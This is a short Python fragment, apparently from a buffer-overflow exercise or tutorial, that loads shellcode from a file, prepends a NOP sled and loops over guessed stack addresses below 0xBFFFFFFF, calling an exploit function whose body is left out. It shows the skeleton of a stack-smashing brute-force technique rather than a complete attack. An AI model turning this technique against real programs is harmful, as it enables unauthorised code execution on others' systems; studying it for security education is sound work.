with open('shellcode') as f:
    shellcode = f.read()
nopsled = '\x90' * SLED_SIZE + shellcode

def exploit(addr): ...

top = 0xBFFFFFFF
for i in range(1000):
    addr = top - i * (SLED_SIZE + 1)
    exploit(addr)
